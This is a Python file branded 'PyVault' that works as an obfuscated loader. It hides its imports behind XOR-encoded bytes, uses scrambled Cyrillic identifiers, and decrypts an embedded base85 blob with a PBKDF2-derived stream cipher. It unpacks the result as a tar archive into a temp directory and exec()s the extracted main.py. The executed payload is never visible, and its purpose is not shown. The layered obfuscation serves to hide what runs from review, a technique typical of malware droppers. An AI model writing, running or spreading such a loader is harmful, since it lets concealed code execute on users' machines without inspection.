# ═══ PyVault ═══
__VAULT_PACK_VENDOR__ = "PyVault"
__VAULT_PACK_REV__ = 2
__VAULT_PACK_SCHEME__ = "vault-stream-v2"
__VAULT_CONTACT__ = "@Developyer"
# ═══════════════

def _vault_xd(key, data):
    kb = key.encode("utf-8")
    return ''.join(chr(v ^ kb[i % len(kb)]) for i, v in enumerate(data))

def _vault_kdf(seed, salt):
    import hashlib
    return hashlib.pbkdf2_hmac('sha256', seed, salt, 150000, dklen=32)

def _vault_stream(key, blob):
    import hashlib
    out = bytearray(len(blob))
    pos = 0
    ctr = 0
    while pos < len(blob):
        blk = hashlib.sha256(key + ctr.to_bytes(8, 'big')).digest()
        n = min(len(blk), len(blob) - pos)
        for i in range(n):
            out[pos + i] = blob[pos + i] ^ blk[i]
        pos += n
        ctr += 1
    return bytes(out)

_pv_b64 = __import__(_vault_xd('оЫНЧщ', [178, 223, 163, 206, 230, 169]))
_pv_tar = __import__(_vault_xd('оЫНЧщ', [164, 223, 162, 205, 185, 241, 181]))
_pv_tmp = __import__(_vault_xd('оЫНЧщ', [164, 219, 189, 219, 182, 244, 188, 194]))
_pv_os = __import__(_vault_xd('оЫНЧщ', [191, 205]))
_pv_sys = __import__(_vault_xd('оЫНЧщ', [163, 199, 163]))

ЈгРГрЬДЎІьК = bytes.fromhex('c9cbd26cb6b6417c7a094f3e7cf4655c')
ЄБЙАкЛкЁЃш = _vault_xd('яВЕ', [80, 52, 190, 16, 76, 187, 79, 207, 72, 110, 30, 199, 213, 50, 144, 191, 135, 213, 158, 38, 211, 89, 61, 84, 201, 48, 198, 88, 173, 153, 62, 127]).encode('latin-1')
вэЇЖлФУУЄМ = _vault_kdf(ЄБЙАкЛкЁЃш, ЈгРГрЬДЎІьК)
ыРФшВхиЌ = 'Dq+QLZdFS?ABpj=NWw0-85;m?Qz(T<$<9K|keV_*bPGNXc<u9$3{YB$f)!}(s$L)n9k7?)fR|p*U1H<p0tywHurtP>=a<rBWoDO{9upV&jzb8*LU@mB_I;<0!$9!dpcvbMW@BD5G%^ci-=bkFz+Bx0nC+;f=LYzvt~6IOc{W_ezHmnZwXwgp^dt<1L0*aY^nRLp5NRrPt`AF>9sB=j7^uOX*&O2K^v8fUwG8y8qjB%{6BckxY>4(bQp!SwKoyStAe%7}Ym)_&FL#?2i@Tb`6~HX_x8Y}P8}rRG1A*@Aq0$u2NzAfY>q`Z<t-Rkp$`9z<oTQXqMppw)$Ghd0K;O;|z;qwcW-RxH`7<s&H=k^ELG(SSb9`s54f4WqkZr(JT$X<*7WDkAb&_wi5fa-9;W>s%o&gC>n%#LI2#|G(Y_cu0hy!25oZQS2;MPRwQmx}1%iU8gOl^fE;@;m*ahXqGq(~Oe@hG=(#{?MZTAbzYc}S0?$c{LBF<1r;$)+ax3ry;>A)7n$u{6G?=XXmFcopt7qyw@CZ=BB-p+@K%ifI|UkLebc$Lfj$I?(cbg?<SJAmfHO`Lnea%LtK}$-@aGcPM78_Y&T_#?)T3Iyx5F#r~B!09!|Of2tOR=8D=?xdU_Dl$%&1YL|JwuNyjFJ(K8S<SfjIDW|Wi*cU(KjW?f6%yM&kRO0;9V@22^=x2L`GzlEPsIdN;U>K>uvZYXKVL$7`fBFJO?cd?w;bSp5OS81&L^^7{#8kVNk{v>JPk5UQEu|}BoJ(>`dxYLR#RfZ_7hdYh&H6lwM|c$eW1a}7YpSiQ55eUG_gK=Q9`gnH{pHuh0!`AN|KW{1y<@ya0C`fw(c%<N$;z14r;tV-sSb9!DNA*vS2M;EY1H;ug`l<Gzs2EO=c)O4!SMaL5$ve&myA}L@XG~HJzzg}*Dx;_XIthg?d`$P;&<Uxuco_9m*a+sV7pH%C&@^t<hsW}trCn_L=jSlk>F4vg`0=8MO<zT7_mV6sk$IQC65HRcaiH0t@3yp;MYdY#(=3VDCB%|d752Enr)G2{MX+=Y7G}0^lwDuw@svqz&4-mMHkQ!M|}pTyBWAa$(}1CfQ^b&%mt3TLzQ)A`7egjsH#O{jrB&>pB&=FsU_*+jYqK9T#06LpWwnnPv^b%ew6$1tXa9}LwvZ9B|;n+uNi0lHdWZG?8!x--jUlXPL@8lNi~<r^Nn{3ijblLkd8?)7Km6wv4buXzSku4bz<Jprc*L|0wMp$1C~c#qw9(Ea-#c{7Cd>qi;`7$ROu$4e5m2eVwVRwMF`|QIk#n~v0Cl4=wqd+#VfbTVsJcTCa4S50Bs-!;{'
ОФдЈЩМгЙСЂер = _pv_b64.b85decode((ыРФшВхиЌ).encode())
ЏЃпкБыеІфзЮЧ = _vault_stream(вэЇЖлФУУЄМ, ОФдЈЩМгЙСЂер)
ПйчцЊКЗящШОЧ = _pv_tmp.mkdtemp(prefix='pv_')
гъхъЯКЪ = _pv_os.path.join(ПйчцЊКЗящШОЧ, 'bundle.tar.gz')
with open(гъхъЯКЪ, 'wb') as мшОИЙЧЊн:
    мшОИЙЧЊн.write(ЏЃпкБыеІфзЮЧ)
with _pv_tar.open(гъхъЯКЪ, 'r:gz') as ЙВБнжЯаннГИИ:
    ЙВБнжЯаннГИИ.extractall(path=ПйчцЊКЗящШОЧ, filter='data')
_pv_state_home = _pv_os.path.abspath(_pv_os.getcwd())
_pv_os.environ['VAULT_STATE_DIR'] = _pv_state_home
_pv_os.chdir(ПйчцЊКЗящШОЧ)
_pv_sys.path.insert(0, ПйчцЊКЗящШОЧ)
with open('main.py', 'r', encoding='utf-8') as ЬЫгЩомиЦгДО:
    ЙгЍСЂЬйкрЬ = ЬЫгЩомиЦгДО.read()
НкеАЉЧя = globals().copy()
НкеАЉЧя['__name__'] = '__main__'
exec(ЙгЍСЂЬйкрЬ, НкеАЉЧя)
